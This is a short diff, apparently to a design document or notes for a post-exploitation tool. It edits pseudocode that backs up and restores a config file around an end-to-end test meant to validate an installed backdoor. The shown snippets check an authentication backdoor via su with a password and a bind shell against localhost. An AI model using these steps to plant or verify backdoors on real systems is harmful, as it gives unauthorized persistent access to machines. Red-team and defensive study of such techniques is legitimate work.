@@ -292,7 +292,7 @@ file.copy(config_path, f"{config_path}.bak")
 if not end_to_end_test():
     print("[error] end to end test failed cleaning up")
     file.remove(config_path)
-    file.moveto(f"{config_path}.bak", config_path)
+    file.move(f"{config_path}.bak", config_path)
     return
 
 file.remove(f"{config_path}.bak")
@@ -302,7 +302,7 @@ End to end test can validate the backdoor - if possible validate normal system f
 
 ```python
 # Auth backdoor - drop to a user account or `nobody` and then auth to a user account
-sys.shell(f"echo -e '{password}\n{password}\n' | su {user} -c 'su {user} -c id'")
+sys.shell(f"echo -e '{password}\n{password}\n' | su {cur_user} -c 'su {cur_user} -c id'")
 
 # Bind shell - check against localhost
 res = sys.shell(f"{shell_client} 127.0.0.1 id")
